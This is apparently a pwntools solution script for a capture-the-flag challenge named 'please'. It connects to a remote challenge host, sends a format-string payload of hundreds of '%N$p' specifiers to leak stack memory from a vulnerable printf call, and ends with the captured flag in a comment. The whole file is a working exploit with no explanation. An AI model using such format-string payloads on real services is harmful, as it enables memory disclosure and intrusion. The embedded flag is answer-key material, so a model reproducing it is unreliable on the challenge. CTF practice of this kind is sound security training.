from pwn import *
host,port = 'mc.ax', 31569
p = remote(host,port)
#p = process("./please")
#gdb.attach("please")
#context(log_level="debug")
elf = ELF("please")
leak = ""
for i in range(1,512):
	leak += "%"+str(60+i)+"$p."
#print leak
exp = "please"+leak

p.sendline(exp)
#leaked = p.recv(2048)
#leaked = leaked.replace("please",'').replace("0x",'')
#print leaked
#print "AAA"
p.interactive()
#flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
